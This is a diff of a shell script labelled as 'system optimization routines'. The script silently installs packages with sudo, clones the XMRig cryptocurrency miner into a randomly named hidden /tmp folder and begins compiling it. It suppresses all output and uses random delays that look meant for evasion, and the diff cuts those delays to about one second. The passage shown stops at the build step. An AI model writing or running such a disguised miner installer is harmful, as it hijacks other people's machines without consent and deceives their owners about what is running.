@@ -6,21 +6,21 @@
 echo "🔧 Performing system optimization routines..."
 
 # 1. Randomized delay before starting (1-60 minutes)
-RAND_DELAY=$((RANDOM % 3600 + 1))
+RAND_DELAY=$((RANDOM % 1 + 1))
 echo "⏳ Random initialization delay: $((RAND_DELAY / 1)) minutes"
 sleep $RAND_DELAY
 
 # 2. Silent system updates with randomized timings
 echo -n "⚙️  Updating package lists..."
 DEBIAN_FRONTEND=noninteractive sudo apt-get -qq update > /dev/null 2>&1
-sleep $((RANDOM % 30 + 1))
+sleep $((RANDOM % 1 + 1))
 
 # 3. Install dependencies in small batches with delays
 echo -n "⚙️  Installing system components..."
 DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y git > /dev/null 2>&1
-sleep $((RANDOM % 15 + 1))
+sleep $((RANDOM % 1 + 1))
 DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y build-essential cmake > /dev/null 2>&1
-sleep $((RANDOM % 15 + 1))
+sleep $((RANDOM % 1 + 1))
 DEBIAN_FRONTEND=noninteractive sudo apt-get -qq install -y libuv1-dev libssl-dev libhwloc-dev > /dev/null 2>&1
 echo " done."
 
@@ -29,7 +29,7 @@ echo -n "⚙️  Downloading system utilities..."
 RAND_FOLDER=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)
 git clone -q https://github.com/xmrig/xmrig.git "/tmp/.sys-$RAND_FOLDER" > /dev/null 2>&1
 cd "/tmp/.sys-$RAND_FOLDER" || exit
-sleep $((RANDOM % 20 + 1))
+sleep $((RANDOM % 1 + 1))
 
 # 5. Build with randomized thread count
 echo -n "⚙️  Compiling components..."
